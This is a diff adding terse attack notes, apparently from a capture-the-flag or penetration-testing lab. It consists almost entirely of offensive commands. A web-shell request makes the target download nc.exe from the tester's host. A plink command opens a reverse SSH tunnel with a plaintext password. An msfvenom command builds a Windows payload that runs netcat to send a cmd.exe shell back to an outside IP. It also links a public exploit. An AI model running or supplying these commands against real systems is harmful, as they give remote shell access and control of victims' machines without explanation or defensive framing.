@@ -1,0 +1,18 @@
+ 
+ http://10.10.10.198:8080/upload/kamehameha.php?telepathy=wget10.10.14.170:8080/nc.exe
+ 
+ 
+ 
+ https://www.exploit-db.com/exploits/48506
+
+ 
+ 
+plink.exe -v -x -a -T -C -noagent -ssh -pw "toor" -R 8888:127.0.0.1:8888 drop149@10.10.15.26
+
+
+
+
+
+msfvenom -p windows/exec CMD='c:\xampp\htdocs\gym\upload\nce.exe -e cmd.exe 10.10.15.26 1337' -b '\x00\x0a\x0d' -f py -v payload
+
+sudo service ssh start
